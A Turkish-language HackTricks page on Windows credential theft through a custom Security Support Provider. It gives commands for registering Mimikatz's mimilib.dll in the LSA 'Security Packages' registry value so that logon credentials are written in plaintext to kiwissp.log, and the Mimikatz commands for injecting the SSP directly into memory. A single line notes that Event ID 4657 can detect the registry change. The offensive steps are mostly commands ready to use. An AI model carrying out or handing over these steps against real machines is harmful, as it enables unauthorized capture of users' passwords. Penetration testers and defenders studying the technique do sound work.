<details>

<summary><strong>AWS hacklemeyi sıfırdan kahramanla öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek** veya **HackTricks'i PDF olarak indirmek** isterseniz [**ABONELİK PLANLARINA**](https://github.com/sponsors/carlospolop) göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**'ı takip edin**.
* **Hacking hilelerinizi paylaşarak** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına **PR gönderin**.

</details>


## Özel SSP

[Bir SSP'nin (Güvenlik Destek Sağlayıcısı) ne olduğunu buradan öğrenin.](../authentication-credentials-uac-and-efs.md#güvenlik-destek-sağlayıcı-arayüzü-sspi)\
Makineye erişmek için kullanılan kimlik bilgilerini **açık metin olarak yakalamak** için **kendi SSP'nizi** oluşturabilirsiniz.

### Mimilib

Mimikatz tarafından sağlanan `mimilib.dll` ikili dosyasını kullanabilirsiniz. **Bu, tüm kimlik bilgilerini açık metin olarak bir dosyaya kaydedecektir.**\
Dll'yi `C:\Windows\System32\` dizinine bırakın.\
Mevcut LSA Güvenlik Paketlerinin bir listesini alın:

{% code title="saldırgan@hedef" %}
```bash
PS C:\> reg query hklm\system\currentcontrolset\control\lsa\ /v "Security Packages"

HKEY_LOCAL_MACHINE\system\currentcontrolset\control\lsa
Security Packages    REG_MULTI_SZ    kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u
```
{% endcode %}

Güvenlik Destek Sağlayıcı listesine (`Security Packages`) `mimilib.dll` ekleyin:
```powershell
reg add "hklm\system\currentcontrolset\control\lsa\" /v "Security Packages"
```
Ve yeniden başlatma sonrasında tüm kimlik bilgileri açık metin olarak `C:\Windows\System32\kiwissp.log` dosyasında bulunabilir.

### Bellekte

Ayrıca, bunu doğrudan bellekte Mimikatz kullanarak enjekte edebilirsiniz (dikkat edin, biraz kararsız/çalışmayabilir):
```powershell
privilege::debug
misc::memssp
```
Bu yeniden başlatmalardan sağ çıkmaz.

### Hafifletme

Olay Kimliği 4657 - `HKLM:\System\CurrentControlSet\Control\Lsa\SecurityPackages` oluşturma/değiştirme denetimi.


<details>

<summary><strong>AWS hacklemeyi sıfırdan kahraman olmak için öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* Şirketinizi HackTricks'te **reklamınızı görmek** veya **HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**'ı takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına PR göndererek paylaşın.

</details>
